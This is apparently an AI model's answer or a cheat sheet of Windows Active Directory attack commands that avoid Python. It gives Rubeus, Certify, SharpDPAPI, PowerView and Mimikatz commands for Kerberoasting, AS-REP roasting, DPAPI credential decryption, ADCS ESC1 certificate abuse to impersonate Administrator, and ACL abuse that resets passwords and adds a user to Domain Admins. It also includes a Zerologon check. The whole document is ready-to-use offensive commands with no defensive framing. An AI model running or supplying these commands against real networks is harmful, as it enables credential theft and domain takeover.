To perform these checks without Python (avoiding Impacket/Certipy), we rely heavily on **.NET assemblies** (like Rubeus, SharpDPAPI, Certify) and **PowerShell** (Active Directory Module, PowerView).

Here are the commands for each specified category.

### 1\. DPAPI Enumeration

**Tool:** `SharpDPAPI` (C\#)
This tool interacts with the Data Protection API to extract saved credentials (browsers, RDP, task scheduler, etc.).

  * **Triage (Scan for all available credential blobs):**
    ```powershell
    .\SharpDPAPI.exe triage
    ```
  * **Extract Machine Master Keys (Requires Admin/SYSTEM):**
    ```powershell
    .\SharpDPAPI.exe machinemasterkeys
    ```
  * **Decrypt Credentials (using a retrieved MasterKey):**
    ```powershell
    .\SharpDPAPI.exe credentials /masterkey:Let-GUID-Here
    ```
  * **Decrypt Blob (using a password/hash):**
    ```powershell
    .\SharpDPAPI.exe blob /target:C:\Users\User\...\Login Data /pvk:BASE64...
    ```

-----

### 2\. ADCS Enumeration (Active Directory Certificate Services)

**Tool:** `Certify` (C\#)
Since we cannot use Python (Certipy), Certify is the standard C\# alternative for finding vulnerable certificate templates.

  * **Find Vulnerable Templates:**
    ```powershell
    .\Certify.exe find /vulnerable
    ```
  * **Enumerate All Templates:**
    ```powershell
    .\Certify.exe find /vulnerable /enrollee:ComputerName
    ```
  * **Request a Certificate (Exploit - e.g., ESC1):**
    ```powershell
    .\Certify.exe request /ca:DC01.corp.local\Corp-CA /template:VulnerableTemplate /altname:Administrator
    ```

-----

### 3\. Kerberoasting

**Tool:** `Rubeus` (C\#) & `Active Directory Module`
Extracting TGS tickets for service accounts to crack offline.

  * **Rubeus (Fastest & Easiest):**

    ```powershell
    # Request tickets and output purely the hash for cracking
    .\Rubeus.exe kerberoast /nowrap /stats

    # Target a specific user
    .\Rubeus.exe kerberoast /user:sqlsvc /nowrap
    ```

  * **PowerShell (AD Module - Enumeration only):**

    ```powershell
    # Identify Kerberoastable users
    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
    ```

-----

### 4\. AS-REP Roasting

**Tool:** `Rubeus` (C\#) & `Active Directory Module`
Targeting users that have "Do not require Kerberos preauthentication" enabled.

  * **Rubeus (Attack):**

    ```powershell
    # automatically finds vulnerable users and outputs the hash
    .\Rubeus.exe asreproast /nowrap /format:hashcat
    ```

  * **PowerShell (AD Module - Enumeration only):**

    ```powershell
    # Find users with PreAuth disabled
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
    ```

-----

### 5\. ACL Enumeration and Abuse

**Tool:** `PowerView` (PowerShell Script) or `SharpView` (.NET Port) & `Active Directory Module`.
Native AD Module is weak for ACL *analysis* but good for simple *abuse*.

  * **Enumeration (PowerView/SharpView):**

    ```powershell
    # Find interesting ACLs for the current user
    Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

    # Check if we have GenericAll/WriteDacl on a target
    Get-DomainObjectAcl -Identity <TargetUser> | ? { $_.SecurityIdentifier -match "My-SID" }
    ```

  * **Abuse (Native AD Module/CMD):**
    If you find you have `GenericAll` or `ResetPassword` rights:

    ```powershell
    # Reset Password (AD Module)
    Set-ADAccountPassword -Identity TargetUser -NewPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force)

    # Add to Group (AD Module)
    Add-ADGroupMember -Identity "Domain Admins" -Members "MyUser"
    ```

-----

### 6\. Delegation Enumeration

**Tool:** `Active Directory Module` & `Rubeus`
Checking for Unconstrained, Constrained, and Resource-Based Constrained Delegation (RBCD).

  * **Unconstrained Delegation (AD Module):**

    ```powershell
    # Find computers trusted for unconstrained delegation (DANGEROUS)
    Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation,ServicePrincipalName
    ```

  * **Constrained Delegation (AD Module):**

    ```powershell
    # Find users/computers trusted for specific services (S4U)
    Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
    ```

  * **RBCD (Resource-Based Constrained Delegation):**

    ```powershell
    # Find objects that allow others to impersonate users to them
    Get-ADObject -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne "$null"} -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
    ```

-----

### 7\. Zerologon Scan

**Tool:** `Mimikatz` or `SharpZeroLogon` (C\#)
We cannot use the standard python `zerologon_tester.py`.

  * **Mimikatz (Check Only):**
    This command checks if the DC is vulnerable without crashing it (usually).

    ```cmd
    # lsadump::zerologon /target:<DC_IP> /account:<DC_NETBIOS>$
    .\mimikatz.exe "lsadump::zerologon /target:192.168.1.10 /account:DC01$" exit
    ```

  * **SharpZeroLogon:**

    ```powershell
    .\SharpZeroLogon.exe -target 192.168.1.10
    ```

### Summary of Toolkit (No Python)

| Attack | Primary Tool (C\#/.NET) | Native Alternative (PowerShell) |
| :--- | :--- | :--- |
| **DPAPI** | `SharpDPAPI.exe` | N/A (Hard to do natively) |
| **ADCS** | `Certify.exe` | N/A |
| **Kerberoast** | `Rubeus.exe` | `Get-ADUser` (Enum only) |
| **AS-REP** | `Rubeus.exe` | `Get-ADUser` (Enum only) |
| **ACLs** | `SharpView.exe` | `Get-Acl` / `Set-ADAccountPassword` |
| **Delegation** | `SharpView.exe` | `Get-ADComputer` |
| **Zerologon** | `Mimikatz.exe` | N/A |
